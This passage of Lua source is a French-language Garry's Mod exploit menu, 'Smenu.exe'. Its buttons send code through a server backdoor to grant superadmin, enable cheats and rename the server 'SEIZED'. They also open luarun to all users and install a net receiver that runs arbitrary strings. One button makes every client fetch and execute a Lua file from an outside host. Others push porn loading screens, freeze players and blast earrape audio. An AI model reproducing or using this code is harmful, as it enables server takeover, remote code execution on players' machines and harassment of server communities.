chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Vous êtes SuperAdmin." )
    SploitNotify("Vous êtes SuperAdmin.")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString( [[
		
			local id = ]] .. LocalPlayer():UserID() .. [[
			
			Player( id ):SetUserGroup( "superadmin" )
		
]] )
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 480 )
Macro:SetText( "Sol MultiColor" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Sol MultiColor activé" )
    SploitNotify("Sol MultiColor activé")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[ 
    local function=("ground")("color.math.66=math.99")


]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 510 )
Macro:SetText( "Changer le LoadingScreen" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Changement effectué ! le loading screen a etait changer :^)" )
    SploitNotify("Changement effectué !")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"sv_loadingurl\", \"https://fr.pornhub.com/\")")
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 540 )
Macro:SetText( "Autorisé Les Cheats Sur Le Serveur" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"sv_cheats\", \"1\")")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Suppression en cours... Les effets seront visibles après le Reboot." )
    SploitNotify("Suppression en cours...")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 500, 570 )
Macro:SetText( "Stop right/etc" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Stop right/etc" )
    SploitNotify("Stop right/etc")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("-right")
end

for k,v in pairs(player.GetAll()) do
    v:ConCommand("-duck")
end

for k,v in pairs(player.GetAll()) do
    v:ConCommand("-back")
end

for k,v in pairs(player.GetAll()) do
    v:ConCommand("-forward")
end
]])
net.WriteBit (1)
net.SendToServer()
end

---------------------------
--    MAP     --
------------------------------
--DANS LE Serveur
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 635, 225 )
        Macro:SetParent(Controller)
        Macro:SetText( "MAPS" )
        Macro:SetFont( "vaporfont3" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 200, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(0,0,0,0)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end

------------------------------------------------------------------------------

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 685, 250 )
Macro:SetText( "Gm_construct" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(110, 241, 110, 110))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"map\", \"gm_construct\")")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Map changé" )
    SploitNotify("Loading...")
    surface.PlaySound("buttons/blip1.wav") 
end
end


local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 685, 280 )
Macro:SetText( "Gm_flatgrass" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(110, 241, 110, 110))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"map\", \"gm_flatgrass\")")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Map changé" )
    SploitNotify("Loading...")
    surface.PlaySound("buttons/blip1.wav") 
end
end

-----------------------------
--    OPEN EXPLOIT MENU    --
-----------------------------
-- DANS LE CONTROLLER
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 635, 45 )
        Macro:SetParent(Controller)
        Macro:SetText( "EXPLOITS" )
        Macro:SetFont( "vaporfont3" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 200, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(0,0,0,0)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end


---------------------------
--    Destruction     --
------------------------------
--DANS LE Serveur
------------------------------  

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 640, 330 )
        Macro:SetParent(Controller)
        Macro:SetText( "Destroy the server" )
        Macro:SetFont( "vaporfont3" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 200, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(0,0,0,0)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 675, 360 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 130, 25 )
Macro:SetText( "Purge" )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 120, 145, 120))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(1920,1080) hud:SetPos(0,0) hud:OpenURL(\"https://loadingscrren.000webhostapp.com/finihacked.png\")]]) v:SendLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/The%20Purge%20-%20Announcement.mp3\", \"mono\", function()end)]]) end" )
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Le mod Purge est Activer" )
    SploitNotify("Spam Visuel/Sonore Activer")
    surface.PlaySound("buttons/blip1.wav") 
end
end


local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 675, 390 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 130, 25 )
Macro:SetText( "ScreenSmenu" )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(255, 120, 145, 120))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[http.Fetch( 'https://loadingscrren.000webhostapp.com/seizedbysmenu.lua', function( body ) RunString( body ) end )]] ) end" )
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Le mod ScreenSmenu est Activer" )
    SploitNotify("Spam Visuel/Sonore Activer")
    surface.PlaySound("buttons/blip1.wav") 
end
end

----------------------------------------------------------------------------------

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 640, 435 )
        Macro:SetParent(Controller)
        Macro:SetText( "Control server" )
        Macro:SetFont( "vaporfont3" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 200, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(0,0,0,0)
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
 

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 685, 470 )
Macro:SetText( "Add BOT" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(110, 241, 110, 110))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Le bot a bien étais ajouté !" )
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"rcon\", \"bot\")")
net.WriteBit (1)
net.SendToServer()
end
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 685, 500 )
Macro:SetText( "Luarun en user" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(110, 241, 110, 110))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Luarun en user OK." )
    SploitNotify("Luarun set en user !")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"groupallow\", \"user\", \"ulx luarun\")")
net.WriteBit (1)
net.SendToServer()
end
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 685, 530 )
Macro:SetText( "Change name server" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(110, 241, 110, 110))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Nom du serveur à changer" )
    SploitNotify("hostname server SEIZED BY SMENU.EXE ")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"rcon\", \"hostname\", \"SEIZED BY SMENU.EXE\")")      
net.WriteBit (1)
net.SendToServer()
end
end

------------------------------
--    SCAN BACKDOOR ALL     --
------------------------------
--DANS LE CONTROLLER
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 70 )
        Macro:SetParent(Controller)
        Macro:SetText( "Scan backdoor" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(110, 241, 110, 110))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Scan backdoor en cours..." )
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()
end
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
        Macro:SetPos( 650, 100 )
        Macro:SetText( "Superadmin Inject" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(110, 241, 110, 110))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
    if( ValidNetString("nostrip") ) then
            BackdoorsFound = 0 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[", "Smenu.exe", "] ", Color( 255, 255, 255 )," Injections de la Backdoor ! - nostrip." )
        netKey = "nostrip"
    else
    chat.AddText( Color( 0, 0, 0, 125 ), "[", "Smenu.exe", "] ", Color( 255, 0, 0 )," Injections de la Backdoor Indisponnibles !" )
    SploitNotify("Injections de la backdoor en cours...")
    surface.PlaySound("vo/npc/male01/herecomehacks01.wav","vo/npc/male01/herecomehacks02.wav") 
	            RunConsoleCommand( "ulx", "logecho", "0" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)" )
				RunConsoleCommand( "ulx", "logecho", "1" )
            net.SendToServer()
end
end
end


local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 160 )
        Macro:SetParent(Controller)
        Macro:SetText( "Scan players" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
Macro.Paint = function( self, w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color(190, 53, 255, 0))
if Macro:IsHovered() then
Macro:SetTextColor( Color( 0, 0, 0 ) )
draw.RoundedBox(0,0,0,w,h,Color(110, 241, 110, 110))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 0))
Macro:SetTextColor( Color(  255, 255, 255 ) )        
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Scan players en cours..." )
    SploitNotify("Scan en cours...")
    surface.PlaySound("buttons/blip1.wav") 
    ScanPlayers()
end
end

------------------------------------------------------------------------------
----------------- SCAN PLAYERS
------------------------------------------------------------------------------

local function gmsg(msg,color)
if color == "color_red" then chat.AddText( "\n",Color( 255,0,0 ),"[Smenu.exe] ",Color( 150,0,0 )," ".. msg) return end
if color == "color_red_red" then chat.AddText( "\n",Color( 255,0,0 ),"[Smenu.exe] ",Color( 255,0,0 )," ".. msg) return end
if color == "color_green" then chat.AddText( "\n",Color( 255,0,0 ),"[Smenu.exe] ",Color( 43,255,0 )," ".. msg) return end
chat.AddText( "",Color( 255,0,0 ),"[Smenu.exe] ",Color( 255,255,225 )," ".. msg)
end

function ScanPlayers()
surface.PlaySound("garrysmod/ui_click.wav")
local playerscount = 0
local playerscount_admin = 0
local playerscount_hryak = 0
local playerscount_hryak_admin = 0
gmsg ("Group - Nickname - SID - Money")
 for k,v in pairs(player.GetAll()) do
    local playermoney = (v.DarkRPVars and v.DarkRPVars.money) or 0
            gmsg(v:GetUserGroup()..": " .. v:Nick() .. " - " .. v:SteamID() .. " - $" .. playermoney.. "","color_green")
 end
end	

------------------------------------------------------------------------------
----------------- SOUNDBOARD ET MUSIQUE
------------------------------------------------------------------------------

-- MUSIQUE 


local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Musiques)
Macro:SetPos( 20, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Be Friend" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/BE%20FRIENDS.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Musique - Be Friend activé" )
    SploitNotify("Musique - Be Friend ")
    surface.PlaySound("buttons/blip1.wav") 
end


local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Musiques)
Macro:SetPos( 20, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Salut c'est cool" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/Salut%20Cest%20Cool.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Musique - Salut c'est cool activé" )
    SploitNotify("Musique - Salut c'est cool ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Musiques)
Macro:SetPos( 20, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Somewhere over" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/Somewhere%20over.mp3\", \"mono\", function()end )]])")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Musique - Somewhere over activé" )
    SploitNotify("Musique - Somewhere over")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Musiques)
Macro:SetPos( 20, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Wesh Alors [JUL]" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end

Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/JUL%20WESH%20ALORS.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Musique - Wesh Alors [JUL] activé" )
    SploitNotify("Musique - Jul WESH ALORS ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 20, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Allahu akbar" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/ALLAHU%20AKBAR%20%20funny%20remix%20v.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Musique - Allahu akbar activé" )
    SploitNotify("Musique - Allahu akbar")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 20, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Chuis bo" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/PZK%20%20%20Chuis%20Bo%20parole%20%20lyrics.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Musique - Chuis bo" )
    SploitNotify("Musique - Chuis bo ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 20, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Earrape - XXXTENTACION - Look At Me" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://xeoxfamily.livehost.fr/XXXTENTACION%20-%20Look%20at%20Me%20(Ear%20Rape).mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Musique - XXXTENTACION" )
    SploitNotify("Musique - XXXTENTACION ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 20, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - Bonjour a tous les amis" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://supronrp.fr/secret/03.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Musique - Bonjour a tous les amis" )
    SploitNotify("Musique - Bonjour a tous les amis ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 20, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Musique - On m'appelle l'ovni" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://musicdeouff.000webhostapp.com/2016.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Musique - On m'appelle l'ovni" )
    SploitNotify("Musique - On m'appelle l'ovni ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 20, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Earrape - Che's boys, anime? OVER9000 BASS" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/5maL.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Earrape - Che's boys, anime? OVER9000 BASS" )
    SploitNotify("Earrape - Che's boys, anime? OVER9000 BASS")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 20, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Earrape - Smash Mouth OVER9000 BASS (-Eyes)" )
Macro.Paint = function()
surface.SetDrawColor(29, 39, 55)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"https://loadingscrren.000webhostapp.com/6377.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Smenu.exe", "] ", Color( 255, 255, 255 ), "Earrape - Smash Mouth OVER9000 BASS (-Eyes)" )
    SploitNotify("Earrape - Smash Mouth OVER9000 BASS (-Eyes)")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Musiques)
Macro:SetPos( 20, 360 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Earrape - Gucci Gang But Im Screaming" )
Macro.Paint = function()
